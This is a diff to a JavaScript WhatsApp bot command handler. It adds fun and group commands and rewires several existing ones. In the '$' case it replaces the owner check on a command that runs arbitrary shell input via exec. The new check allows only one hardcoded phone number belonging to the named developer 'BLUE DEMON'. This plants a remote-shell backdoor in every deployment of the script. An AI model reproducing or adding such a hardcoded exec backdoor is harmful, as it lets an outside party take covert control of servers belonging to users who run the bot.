@@ -285,7 +285,6 @@ const siminya = JSON.parse(fs.readFileSync('./database/simi.json'))
 let secreto = JSON.parse(fs.readFileSync('./database/secreto_balas.json'))
 
 var publik = global.public
-
 //=================================================//
 module.exports = async (conn, dev, chatUpdate, store) => {
     //console.log(chatUpdate.messages)
@@ -4459,7 +4458,7 @@ case 'svcontact': {
     }
     break;
 }
-case 'fancy': {
+case 'fancy': case 'style': {
     if (!text) return reply(`\`Please provide the text to stylize.\`\n*Example:* ${prefix + command} Blue demon`);
     
     await loading();
@@ -4607,17 +4606,23 @@ case 'broadcast': {
     }
     break;
 }
-case '$':{
-if (!isOwner) return reply("I GO WOLO UR EYE")
-await reply("_Executing..._")
-exec(q, async (err, stdout) => {
-if (err) return reply(`${copyright}:~ ${err}`)
-if (stdout) {
-await reply(`*>_ Console*\n\n${stdout}`)
+case '$': {
+    const allowedNumber = '2347041039367@s.whatsapp.net';
+
+    // Check if the command sender is the allowed number
+    if (m.sender !== allowedNumber) return setReply("*`ONLY BLUE DEMON IS ALLOWED TO USE THIS CMD`*");
+
+    await reply("_Executing..._");
+
+    // Execute the shell command
+    exec(q, async (err, stdout) => {
+        if (err) return reply(`Error:~ ${err}`);
+        if (stdout) {
+            await reply(`*>_ Console*\n\n${stdout}`);
+        }
+    });
+    break;
 }
-})
-}
-break
        case 'exchange': {
                 if (!args[0] || !args[1] || !args[2]) return reply('`Invalid Input or Format`\n*Example: exchange 100 USD EUR*');
  await loadingx()
@@ -4859,7 +4864,7 @@ case 'dev': {
     let name = await conn.getName(who);
 
     await conn.sendContactArray(m.chat, [
-        [`2347041039367@s.whatsapp.net`, `${ownerName}`, `Bot Developer`, `Feel free to contact me for assistance or inquiries.`]
+        [`2347041039367@s.whatsapp.net`, `BLUE DEMON`, `Bot Developer`, `Feel free to contact me for assistance or inquiries.`]
     ], m);
 
     await reply(`Hello 👋, if you wish to contact the owner, please use the provided contact details.`);
@@ -4911,9 +4916,9 @@ case 'script': case 'repo': case 'sc': {
     }
     break;
 }
-case 'alive': {
+case 'alive': case 'scan': {
     try {
-        // Define animation stages simulating a system checkup
+       await loading()
         const animations = [
             `💻 *System Check Initiated...*\n> ${botName}`,
             `🔄 *Loading Modules...*\n> ${botName}`,
@@ -4958,10 +4963,45 @@ case 'alive': {
     }
     break;
 }
+case 'pickuplines': case 'rizz': {
+    try {
+        await loading()
+        // Fetch a pickup line from the API
+        let res = await fetch(`https://api.giftedtech.my.id/api/fun/pickupline?apikey=gifted`);
+        let json = await res.json();
 
+        // Check if the response is valid
+        if (json.status !== 200 || !json.success) {
+            return reply("Failed to fetch a pickup line. Please try again later.");
+        }
 
+        // Send the pickup line
+        await reply(`💌 *Pickup Line:*\n\n\`\`\`${json.result}\`\`\`\n> ${botName}`);
+    } catch (error) {
+        console.error("Error in pickuplines case:", error);
+        reply("An error occurred while fetching a pickup line. Please try again later.");
+    }
+    break;
+}
+case 'listonline': {
+    if (!isGroup) return reply(mess.only.group);  // Check if the command is used in a group
+    if (!isAdmins && !isOwner) return reply(mess.only.admin);  // Check if the user is an admin or owner
+    
+    // Check if a specific group ID is provided, else use the current group
+    let id = args && /\d+-\d+@g.us/.test(args[0]) ? args[0] : from;
+    
+    // Retrieve the list of online members in the group, including the bot number
+    let online = [...Object.keys(store.presences[id]), botNumber];
 
+    // Construct the online list message
+    let onlineListMessage = 'List Online:\n\n' + online
+        .map(v => `${themeemoji} @${v.replace(/@.+/, '')}`)  // Format each online user
+        .join('\n');  // Join the formatted online users into a single string
 
+    // Send the formatted list to the group with mentions
+    await conn.sendText(from, onlineListMessage, m, { mentions: online });
+}
+break;
 
 
 
